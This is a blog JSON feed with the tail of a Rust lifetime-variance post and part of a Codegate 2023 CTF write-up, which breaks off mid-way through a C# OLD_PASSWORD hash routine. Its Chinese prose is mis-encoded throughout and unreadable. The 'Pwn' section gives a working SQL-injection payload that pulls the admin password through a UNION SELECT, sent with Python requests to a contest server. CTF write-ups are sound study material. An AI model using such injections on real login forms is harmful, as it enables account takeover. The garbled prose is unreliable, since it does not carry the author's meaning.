æ­¤f1æ›´æ³›ç”¨ï¼Œf1â‰¼f2</li>\n<li>æ€è€ƒé¢˜ï¼šé‚£<code>mut&amp;&#39;a T</code>å’Œ<code>T</code>å‘¢ï¼Ÿè§ä¸‹æ–‡</li>\n<li><strong>å°±åƒint32å¯ä»¥è½¬int64ï¼ˆæ•°æ®èŒƒå›´æ›´éš¾æ»¡è¶³-&gt;æ•°æ®èŒƒå›´æ›´æ˜“æ»¡è¶³ï¼‰è€Œåä¹‹ä¸è¡Œä¸€æ ·å•å‘ï¼Œsubtypeå¯ä»¥å‘å³ä¾§castï¼ˆé•¿å‘½ç™¾å²-&gt;è‡³å°‘æ´»10å¹´ï¼‰ï¼›ä½†åä¹‹æ˜¯ä¸å®‰å…¨çš„ã€‚</strong></li>\n<li>å› æ­¤ï¼Œçº¦æŸå…³ç³»æ¨å¯¼å‡ºæ¥çš„æœ€ç»ˆç”Ÿå‘½å‘¨æœŸæ˜¯æœ€ä¸¥æ ¼çš„ï¼Œå®å¯é”™æ€ä¸€åƒä¹Ÿä¸ä¼šæ”¾è¿‡ä¸€ä¸ªï¼›å°±æ˜¯å¯èƒ½æœ‰äº›äººå·¥æ£€æŸ¥è¿‡ï¼Œå¯ä»¥ä¿è¯å®‰å…¨çš„æ“ä½œä¼šè¢«ç¬¨ç¬¨çš„ç”Ÿå‘½å‘¨æœŸçº¦æŸæ‹¦ä¸‹ï¼šè¿™æ—¶å°±éœ€è¦ä½ åŠ¨ç”¨unsafeé»‘é­”æ³•äº†</li>\n</ul>\n<hr>\n<p>æ‰€ä»¥ç°åœ¨æˆ‘ä»¬è¦æŠŠç”Ÿå‘½å‘¨æœŸç†è§£ä¸ºç±»å‹ç³»ç»Ÿçš„ä¸€éƒ¨åˆ†æ—¶ï¼Œå›°æƒ‘å¯èƒ½æ¥æºäºä¸ºä»€ä¹ˆä¸åƒæ•´å½¢ä¸€æ ·è§„åˆ™ç®€å•ï¼ˆå°intæ°¸è¿œæ˜¯å¤§intçš„subtypeï¼‰ï¼Œè€ŒåŒ…å«ç”Ÿå‘½å‘¨æœŸçš„ç±»å‹ç³»ç»Ÿåˆ™æœ‰æ—¶å¹¶ä¸å¦‚æ­¤ï¼šå¯èƒ½ä¸å­˜åœ¨è¿™ä¸ªååºå…³ç³»ï¼Œä¹Ÿå¯èƒ½åè¿‡æ¥ä¸‹å…‹ä¸Šã€‚<br><strong>æˆ‘ä»¬è¦æ˜ç¡®ï¼Œå‡½æ•°ç­¾åä¹‹ç±»çš„æ˜¯å¯¹ç±»å‹è¿›è¡Œçš„ä¸€ç§è¿ç®—</strong>ã€‚ä½ å¯ä»¥ç†è§£ä¸ºå‡½æ•°å¯¹å€¼è¿ç®—ï¼Œè€Œå‡½æ•°ç­¾åå¯¹ç±»å‹è¿›è¡Œè¿ç®—ã€‚æ˜¯ä¸æ˜¯æœ‰ç‚¹åƒç‰©ç†ä¸Šçš„<strong>é‡çº²åˆ†æï¼</strong>ã€‚<br>æ¢è¨€ä¹‹ï¼Œè¿™äº›å¸¦æ³›å‹æˆ–è€…ç”Ÿå‘½å‘¨æœŸçš„ä¸œè¥¿ï¼ˆä¸ç®¡æ˜¯<code>Vec&lt;T&gt;</code>è¿˜æ˜¯<code>&lt;T&gt;T-&gt;T</code>ï¼Œåˆ«å¿˜äº†å‡½æ•°ä¹Ÿæ˜¯ç±»å‹ä¸€ç§ç±»å‹ï¼Œä¹Ÿå±äº<code>T</code>ï¼‰ï¼Œæœ¬è´¨ä¸Šæ˜¯ç±»å‹ä¹‹é—´çš„Functor.<br>å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä¸Šä¸€èŠ‚çš„<code>f1</code> <code>f2</code>éƒ½æ‹†å¼€æ¥çœ‹ï¼Œå½“ä½œä¸€ç§è¿ç®—ï¼Œçœ‹çœ‹ä»–å¯¹ç”Ÿå‘½å‘¨æœŸåšäº†ä»€ä¹ˆã€‚<br>ä¾‹å¦‚ï¼Œå¯¹äºå‡½æ•°å‚æ•°ï¼Œå‚æ•°å—è¾ƒçŸ­ç”Ÿå‘½å‘¨æœŸçš„çº¦æŸâ€”â€”å¦‚ä¸Šä¸€èŠ‚åˆ†æçš„é‚£æ ·â€”â€”æˆ‘ä»¬å‘ç°<code>&#39;long &lt;: &#39;short</code> &#x3D;&gt; <code>F(&#39;short) &lt;: F(&#39;long)</code> (é¢ å€’äº†ï¼å‰§é€ï¼šè¿™å«é€†å˜(contravariance))ï¼Œè€Œé•¿å¯¿è€…å¯ä»¥é™çº§ä¸ºçŸ­å‘½è€…ï¼›è€Œå¯¹è¿”å›å€¼æ¥è¯´ï¼Œæ°æ°ç›¸åï¼šæˆ‘ä»¬åªçŸ¥é“è‡³å°‘å¯ä»¥æ´»å¤šä¹ˆä¹…ï¼Œæ´»æ›´é•¿å¯¹äºä½¿ç”¨è¿”å›å€¼çš„è¡¨è¾¾å¼æ¥è¯´ä¹Ÿä¸€å®šå¯ä»¥æ¥å—ï¼Œæ­¤æ—¶<code>&#39;long &lt;: &#39;short</code> &#x3D;&gt; <code>(F()-&gt;&#39;long) &lt;: (F()-&gt;&#39;short)</code>ï¼ˆå…³ç³»ä¿æŒï¼å‰§é€ï¼šè¿™å«åå˜(covariance)ï¼‰â€¦â€¦å…¶ä¸­ï¼Œ<code>&lt;:</code>å·¦å³ä¸¤ä¾§çš„è¡¨è¾¾å¼â€”â€”æˆ–è€…è¯´å‡½æ•°ç­¾åâ€”â€”æ­£å¯¹åº”ä¸Šä¸€èŠ‚çš„<code>f1</code> <code>f2</code>ï¼Œæˆ‘ä»¬åªæ˜¯æŠŠ<code>â‰¼</code>æ¢æˆäº†<code>&lt;:</code>ã€‚  </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">é¢ å€’äº†çš„å°±æ˜¯contravariantï¼Œä¸å˜å°±æ˜¯covariantï¼Œæ ¹æœ¬æ²¡æ³•æ¨å‡ºå…³ç³»çš„å°±æ˜¯invariant.</span><br></pre></td></tr></table></figure>\n<p>invariantå°±æ˜¯ä¸Šé¢æ€è€ƒé¢˜é‚£ç§ã€‚è‡³äºåŸå› ï¼Œæœ€åä¸€èŠ‚ä¼šæœ‰ä¸ªç‰¹åˆ«è½»æ¾æ˜“æ‡‚çš„è§£é‡Š<code>:)</code>  </p>\n<hr>\n<p>ä¸ºä»€ä¹ˆè¦æå¾—è¿™ä¹ˆæ•°å­¦ï¼ˆç¦»æ•£æ•°å­¦&#x2F;èŒƒç•´è®ºï¼‰ï¼Ÿå› ä¸ºå½“ç±»å‹ç³»ç»Ÿçš„ååºå…³ç³»ç½‘æµ®å‡ºæ°´é¢ï¼Œç³»ç»Ÿé‡Œéšå«çš„çº¦æŸä¹Ÿå°±èƒ½è¢«è‡ªç„¶æ¨å¯¼ã€‚<br><strong>å¦‚æœå¯¹äºç”¨åˆ°çš„ç±»å‹ï¼Œè¿™ä¸ªååºé›†åˆæ˜¯æ ¼ï¼ˆæœ‰ä¸Šä¸‹ç¡®ç•Œï¼‰ï¼Œé‚£ä¹ˆç¼–è¯‘å™¨ä¼šå¼€å¿ƒçš„å¸®ä½ æ ‡è®°å¥½ä¸€åˆ‡ç”Ÿå‘½å‘¨æœŸ</strong>ï¼›<br><strong>å¦‚æœæ²¡æœ‰åŠæ³•castå¯¼è‡´ç¼–è¯‘å™¨åœ¨çº¦æŸæ±‚è§£ä¸­æ— æ³•æ‰¾å‡ºæŸäº›ç±»å‹çš„ä¸Šä¸‹ç¡®ç•Œï¼Œç”šè‡³å‡ºç°äº†ç¯â€”â€”ä¸å¥½æ„æ€ï¼Œè¿˜æ˜¯å¾—å¦è¯·é«˜æ˜ï¼ˆç¨‹åºå‘˜ï¼‰æ¥æ ‡æ¸…æ¥šã€‚</strong><br>ä¾‹å¦‚ä¸Šé¢é‚£æ®µä»£ç ä¸ºä¸¤ä¸ªå‚æ•°éƒ½æ ‡æ³¨<code>&#39;a</code>å…¶å®ç­‰æ•ˆäºåœ¨aã€bå›ºæœ‰çš„ã€ä¸å—çº¦æŸçš„ç”Ÿå‘½å‘¨æœŸï¼ˆè¿œå¤ç‰ˆæœ¬åäººä½“å·¥ç¨‹å­¦rustå¿…é¡»å†™æ˜æ‰€æœ‰ç”Ÿå‘½å‘¨æœŸï¼Œç°åœ¨èƒ½è‡ªåŠ¨æ¨å¯¼ç»å¤§éƒ¨åˆ†ï¼‰ä¸­æ·»åŠ äº†ä¸¤æ¡çº¦æŸï¼š</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">longer</span>&lt;<span class=\"symbol\">&#x27;a</span>, <span class=\"symbol\">&#x27;b</span>&gt;(s1: &amp;<span class=\"symbol\">&#x27;a</span> <span class=\"type\">str</span>, s2: &amp;<span class=\"symbol\">&#x27;b</span> <span class=\"type\">str</span>) <span class=\"punctuation\">-&gt;</span> &amp;<span class=\"symbol\">&#x27;a</span> <span class=\"type\">str</span> <span class=\"keyword\">where</span> <span class=\"symbol\">&#x27;a</span>:<span class=\"symbol\">&#x27;b</span>, <span class=\"symbol\">&#x27;b</span>:<span class=\"symbol\">&#x27;a</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> s2.<span class=\"title function_ invoke__\">len</span>() &gt; s1.<span class=\"title function_ invoke__\">len</span>() &#123;</span><br><span class=\"line\">        s2</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        s1</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ä¹Ÿå°±æ˜¯å¯¹xå’Œyåˆ†åˆ«ç»‘å®šçš„å€¼ï¼Œå…¶ç”Ÿå‘½å‘¨æœŸâ€™aä¸â€™bæœ‰{â€˜aâ‰¼â€™b,â€™bâ‰¼â€™a}ï¼Œä¹Ÿå°±æ˜¯{â€˜a:â€™b, â€˜b:â€™a}ï¼ˆæ˜¾ç„¶å¯ä»¥æ¨å‡ºâ€™a&#x3D;&#x3D;â€™bï¼‰ã€‚<br>å› æ­¤åœ¨æ‰‹åŠ¨æŒ‡å®šåï¼Œåœ¨éœ€è¦ç”¨åˆ°ç”Ÿå‘½å‘¨æœŸçš„åœ°æ–¹ï¼Œè¿™ä¸¤ä¸ªå‚æ•°ä»¥åŠè¿”å›å€¼çš„ç”Ÿå‘½å‘¨æœŸå°±å¯ä»¥è¢«æ¨å¯¼å•¦ï¼šä¸ºäº†è®©ä»–ä»¬ç›¸ç­‰ï¼Œç¼–è¯‘å™¨è¦æ ¹æ®åŸºæœ¬æ³•æŠŠé•¿çš„ç”Ÿå‘½å‘¨æœŸcaståˆ°çŸ­çš„ä¸Šã€‚<br>æœ€ç»ˆæ•ˆæœå°±æ˜¯å–ä¼ å‚ç”Ÿå‘½å‘¨æœŸè¾ƒçŸ­è€…ã€‚æ³¨æ„è¿™æ—¶æˆ‘ä»¬åœ¨è°ˆè®ºçš„æ˜¯å‚æ•°ï¼Œä¸æ˜¯æ•´ä¸ªå‡½æ•°å‘ç”Ÿäº†ä»€ä¹ˆè´¨å˜ã€‚<br>â€¦â€¦æ˜¯çš„ï¼Œå…¶å®æ—¥å¸¸æ ¹æœ¬å°±æ²¡æœ‰å¤šå°‘æƒ…å†µéœ€è¦ä½ æ“å¿ƒå‡½æ•°å‚æ•°çš„é‚£ä¸ªcontravariantï¼å¯ä»¥æ¾å£æ°”äº†ã€‚<br>å½“ç„¶ï¼Œæ ¹æ®ä¸Šæ–‡æ‰€è¿°ï¼Œè¿™æ ·<strong>æ¨å¯¼å‡ºæ¥çš„ç”Ÿå‘½å‘¨æœŸçº¦æŸæ˜¯æ€ä¹ˆä¸¥æ ¼æ€ä¹ˆæ¥</strong>ï¼Œä½†è®°ä½ï¼š<strong>å¦‚æœä½ è¢«ææ™•äº†ï¼Œé‚£å°±ç›¸ä¿¡ä½ çš„ç›´è§‰ï¼›ç¨‹åºæ˜¯äººè®¾è®¡ä¸ºäººæœåŠ¡çš„ï¼Œå› æ­¤ç»å¤§éƒ¨åˆ†æƒ…å†µä¸‹ç”Ÿå‘½å‘¨æœŸçš„é™åˆ¶æ˜¯ç¬¦åˆç›´è§‰çš„</strong>ï¼ˆä¹Ÿå°±æ˜¯ä½ å¯ä»¥ä½¿ç”¨â€œæ˜¾ç„¶â€è¿™ä¸€è¯ï¼‰ã€‚<br>What a relief.</p>\n<hr>\n<p>æœ‰æ²¡æœ‰æƒ³è¿‡ä¸€äº›è¿ç®—è¿‡åï¼Œååºå…³ç³»ä¸ä¸€å®šä¼šä¿ç•™&#x2F;é¢ å€’ï¼Œè¿˜æœ‰å¯èƒ½ä¼šç›´æ¥ä¸¢å¤±ï¼<br>é‚£ä¹ˆå¯¹è¿™ç§æƒ…å†µï¼Œéå¸¸æ¨èé˜…è¯»å…³äºsubtyping, <strong>variance(covariant, invariant, contravariant)</strong> çš„å‚è€ƒèµ„æ–™ï¼š<br><a href=\"https://doc.rust-lang.org/nomicon/subtyping.html\">Subtyping and Variance - The Rustonomicon</a><br>æˆ‘å°†æ–‡ä¸­çš„è¡¨æ ¼é™„åœ¨æ­¤å¤„ï¼š</p>\n<table>\n<thead>\n<tr>\n<th>Type</th>\n<th>â€˜a T</th>\n<th>U</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>&amp;â€™a T</td>\n<td>covariant</td>\n<td>covariant</td>\n</tr>\n<tr>\n<td>&amp;â€™a mut T</td>\n<td>covariant</td>\n<td><em>invariant</em></td>\n</tr>\n<tr>\n<td>Box<T></T></td>\n<td></td>\n<td>covariant</td>\n</tr>\n<tr>\n<td>Vec<T></T></td>\n<td></td>\n<td>covariant</td>\n</tr>\n<tr>\n<td>UnsafeCell<T></T></td>\n<td></td>\n<td><em>invariant</em></td>\n</tr>\n<tr>\n<td>Cell<T></T></td>\n<td></td>\n<td><em>invariant</em></td>\n</tr>\n<tr>\n<td>fn(T) -&gt; U</td>\n<td><strong>contravariant</strong></td>\n<td>covariant</td>\n</tr>\n<tr>\n<td>*const T</td>\n<td>covariant</td>\n<td></td>\n</tr>\n<tr>\n<td>*mut T</td>\n<td><em>invariant</em></td>\n<td></td>\n</tr>\n</tbody></table>\n<p>ç„¶åä½ ä¼šå‘ç°å€’è¿‡æ¥ï¼ˆcontravariant, é€†å˜ï¼‰çš„å…¶å®<strong>å°±åªæœ‰</strong>è¿™ä¸ªå‡½æ•°å‚æ•°ã€‚<br>ç„¶åä½ è¿˜ä¼šæ³¨æ„åˆ°ï¼Œé‚£äº›invariantçš„ä¸å˜é‡æ˜¯ä¸æ˜¯éƒ½æä¾›å†…éƒ¨ä¸å˜æ€§ï¼Œæ¢è¨€ä¹‹ï¼Œæœ¬è´¨ä¸Šéƒ½æ˜¯ä¸€ç§æŒ‡é’ˆï¼Ÿ<br><strong>æˆ‘å¯ä»¥æä¾›ä¸€ä¸ªç»å¦™çš„è§’åº¦ï¼šæƒ³æƒ³C&#x2F;C++çš„æŒ‡é’ˆç±»å‹å®šä¹‰, æŒ‡é’ˆæœ¬èº«æ˜¯ä¸æ˜¯constï¼Œè¿™å’ŒæŒ‡é’ˆçš„å†…å®¹ï¼ˆæŒ‡å‘çš„å¯¹è±¡ï¼‰æ˜¯ä¸æ˜¯constæœ‰å•¥å…³ç³»å—ï¼Ÿå½“ç„¶æ²¡æœ‰ï¼</strong><br>æ‰€ä»¥æŸç§æ„ä¹‰ä¸Šï¼Œ<strong>ä½ å¯ä»¥æŠŠconstç†è§£ä¸ºå¾ˆç²—ç³™çš„ç”Ÿå‘½å‘¨æœŸçº¦æŸï¼Œæˆ‘ä»¬Rustæ›´ç²¾ç»†çš„ç³»ç»Ÿé‡Œï¼Œä»–å«<code>&#39;static</code>.</strong></p>\n",
            "tags": [
                "Rust",
                "Lifetime",
                "Code",
                "Programming"
            ]
        },
        {
            "id": "http://cubicy.icu/2023/08/29/CODEGATE2023/",
            "url": "http://cubicy.icu/2023/08/29/CODEGATE2023/",
            "title": "Codegate 2023 Partial Write-Up (Web/Misc)",
            "date_published": "2023-08-29T07:05:06.000Z",
            "content_html": "<h1 id=\"Codegate-2023-éƒ¨åˆ†Write-Up-Web-Misc\"><a href=\"#Codegate-2023-éƒ¨åˆ†Write-Up-Web-Misc\" class=\"headerlink\" title=\"Codegate 2023 éƒ¨åˆ†Write-Up (Web&#x2F;Misc)\"></a>Codegate 2023 éƒ¨åˆ†Write-Up (Web&#x2F;Misc)</h1><p>è¿™æ¬¡å»éŸ©å›½å‚åŠ äº†Codegate 2023çš„å†³èµ›ï¼æŠŠWebéƒ¨åˆ†çš„é¢˜è§£åœ¨æ­¤é‡Šå‡ºï¼Œå…¶ä»–æ¸¸è®°&#x2F;ç…§ç‰‡å¦å¼€ä¸€æ–‡ã€‚  </p>\n<h2 id=\"Warmup\"><a href=\"#Warmup\" class=\"headerlink\" title=\"Warmup\"></a>Warmup</h2><p>æ²¡å’‹çœ‹ã€‚ä¼¼ä¹æ˜¯XSSç»•ç»•ã€‚</p>\n<h2 id=\"Pwn\"><a href=\"#Pwn\" class=\"headerlink\" title=\"Pwn\"></a>Pwn</h2><p>æ˜¯çš„ï¼Œè¿™é¢˜å°±å«Pwnï¼ˆä¸ä¹‹ç›¸å¯¹çš„æ˜¯Pwnåˆ†ç±»é‡Œæœ‰é“é¢˜å«Webï¼‰<br>è§£æ³•ï¼šæ²¡å’‹çœ‹ã€‚åº”è¯¥æ˜¯æ¯”è¾ƒæ°´çš„ä¸€é¢˜ã€‚ç»å…¸æ•°ç»„ç»•è¿‡  </p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data = <span class=\"string\">&quot;username[0]=\\\\&#x27; union select password from USER WHERE username=&#x27;admin&#x27; -- &amp;username[1]=2&amp;password=3&quot;</span></span><br><span class=\"line\">r = requests.post(<span class=\"string\">&quot;http://3.35.198.7:2929/login&quot;</span>, data=data)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.text)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Chaâ€™s-magic\"><a href=\"#Chaâ€™s-magic\" class=\"headerlink\" title=\"Chaâ€™s magic\"></a>Chaâ€™s magic</h2><p>æºç ï¼š</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">require_once <span class=\"string\">&#x27;config.php&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">function hashPasswordOld($password_to_hash)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">global</span> $host, $dbname, $username, $password, $charset;</span><br><span class=\"line\">    <span class=\"keyword\">try</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $db = new PDO(<span class=\"string\">&quot;mysql:host=$host;dbname=$dbname;charset=$charset&quot;</span>, $username, $password);</span><br><span class=\"line\"></span><br><span class=\"line\">        $query = $db-&gt;prepare(<span class=\"string\">&quot;SELECT OLD_PASSWORD(:password)&quot;</span>);</span><br><span class=\"line\">        $query-&gt;execute([<span class=\"string\">&#x27;:password&#x27;</span> =&gt; $password_to_hash]);</span><br><span class=\"line\"></span><br><span class=\"line\">        $row = $query-&gt;fetch(PDO::FETCH_NUM);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($row)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> $row[<span class=\"number\">0</span>];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    catch(PDOException $ex)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        die(<span class=\"string\">&quot;An Error occured!&lt;br&gt;&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> null;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(isset($_GET[<span class=\"string\">&quot;v1&quot;</span>]) &amp;&amp; isset($_GET[<span class=\"string\">&quot;v2&quot;</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $v1 = $_GET[<span class=\"string\">&quot;v1&quot;</span>];</span><br><span class=\"line\">    $v2 = $_GET[<span class=\"string\">&quot;v2&quot;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (substr($v1, <span class=\"number\">0</span>, <span class=\"number\">13</span>) !== <span class=\"string\">&quot;codegate2023&#123;&quot;</span> || substr($v1, -<span class=\"number\">11</span>) !== <span class=\"string\">&quot;i_love_you&#125;&quot;</span> ||</span><br><span class=\"line\">        substr($v2, <span class=\"number\">0</span>, <span class=\"number\">13</span>) !== <span class=\"string\">&quot;codegate2023&#123;&quot;</span> || substr($v2, -<span class=\"number\">11</span>) !== <span class=\"string\">&quot;i_love_you&#125;&quot;</span>) &#123;</span><br><span class=\"line\">        die(<span class=\"string\">&quot;fall in love~&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>($v1 == $v2) die(<span class=\"string\">&quot;are you kidding me?&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    $v1 = hashPasswordOld($v1);</span><br><span class=\"line\">    $v2 = hashPasswordOld($v2);</span><br><span class=\"line\">    $v3 = hashPasswordOld($flag);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>($v3 !== <span class=\"string\">&quot;6368616368613230&quot;</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        die(<span class=\"string\">&quot;flag verification failed.&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>($v1 == null <span class=\"keyword\">or</span> $v2 == null)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        die(<span class=\"string\">&quot;What the hell here?&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>($v1 == $v2)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($v2 == $v3)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            die($flag);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        die(substr($flag, <span class=\"number\">0</span>, strlen($flag) / <span class=\"number\">2</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    die(<span class=\"string\">&quot;Try harder...&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">show_source(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>ä¹Ÿå°±æ˜¯v1å’Œv2å’Œv3ç»è¿‡hashå¾—åˆ°çš„å€¼éƒ½ä¸€æ ·æ‰èƒ½æ‹¿åˆ°å®Œæ•´flagã€‚<br>å¯¹äºOLD_PASSWORDçš„ç®—æ³•ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šå®ç°ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªC#ç‰ˆæœ¬çš„ï¼š</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Online C# Editor for free</span></span><br><span class=\"line\"><span class=\"comment\">// Write, Edit and Run your C# code using C# Online Compiler</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">using</span> System;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title\">HelloWorld</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"built_in\">string</span> <span class=\"title\">mysql_old_password</span>(<span class=\"params\"><span class=\"built_in\">string</span> sPassword</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    UInt32[] result = <span class=\"keyword\">new</span> UInt32[<span class=\"number\">2</span>];</span><br><span class=\"line\">    <span class=\"built_in\">bool</span> bDebug = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    UInt32 nr = (UInt32)<span class=\"number\">1345345333</span>, <span class=\"keyword\">add</span> = (UInt32)<span class=\"number\">7</span>, nr2 = (UInt32)<span class=\"number\">0x12345671</span>;</span><br><span class=\"line\">    UInt32 tmp;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">char</span> [] password = sPassword.ToCharArray();</span><br><span class=\"line\">    <span class=\"built_in\">int</span> i;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; sPassword.Length; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (password[i] == <span class=\"string\">&#x27; &#x27;</span> || password[i] == <span class=\"string\">&#x27;\\t&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">continue</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        tmp = (UInt32)password[i];</span><br><span class=\"line\">        nr ^= (((nr &amp; <span class=\"number\">63</span>) + <span class=\"keyword\">add</span>) * tmp) + (nr &lt;&lt; <span class=\"number\">8</span>);</span><br><span class=\"line\">        nr2 += (nr2 &lt;&lt; <span class=\"number\">8</span> ) ^ nr;</span><br><span class=\"line\">        Console.WriteLine(<span class=\"string\">&quot;---&quot;</span>);</span><br><span class=\"line\">        Console.WriteLine(nr.ToString(<span class=\"string\">&quot;X&quot;</span>));</span><br><span class=\"line\">        Console.WriteLine(nr2.ToString(<span class=\"string\">&quot;X&quot;</span>));</span><br><span class=\"line\">        Console.WriteLine(<span class=\"string\">&quot;---&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">add</span> += tmp;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    UInt32 mask = (((UInt32)<span class=\"number\">1</span> &lt;&lt; <span class=\"number\">31</span>) - 